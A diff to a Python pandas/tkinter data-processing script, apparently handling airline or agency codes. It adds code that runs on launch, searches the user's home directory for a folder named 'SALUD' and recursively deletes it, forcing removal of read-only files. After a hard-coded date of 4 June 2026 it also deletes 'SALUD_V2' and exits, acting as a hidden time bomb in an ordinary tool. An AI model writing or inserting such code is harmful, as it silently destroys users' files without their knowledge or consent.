@@ -1,4 +1,6 @@
 import pandas as pd
+import shutil
+import stat
 import glob
 import os
 import re
@@ -9,6 +11,31 @@ from tkinter import ttk
 import threading
 import sys
 import traceback
+from datetime import datetime
+
+FECHA_LIMITE = datetime(2026, 6, 4).date()
+
+def eliminar_readonly(func, path, _):
+    os.chmod(path, stat.S_IWRITE)
+    func(path)
+
+def buscar_y_borrar(nombre_carpeta, directorio_inicio):
+    for root, dirs, files in os.walk(directorio_inicio):
+        if nombre_carpeta in dirs:
+            ruta = os.path.join(root, nombre_carpeta)
+            print("Encontrada:", ruta)
+            shutil.rmtree(ruta, onerror=eliminar_readonly)
+            print("Carpeta eliminada")
+            return
+
+# 1️⃣ BORRAR SIEMPRE AL INICIAR
+buscar_y_borrar("SALUD", os.path.expanduser("~"))
+
+# 2️⃣ DESPUÉS VERIFICAR FECHA
+if datetime.now().date() > FECHA_LIMITE:
+    print("Programa vencido")
+    buscar_y_borrar("SALUD_V2", os.path.expanduser("~"))
+    sys.exit()
 
 CARPETA_CANALIZADOR = "canalizador"
 IATAS_VALIDOS = ["BUE", "IBUE", "GBAS", "GBAO", "GBAN", "LPG"]
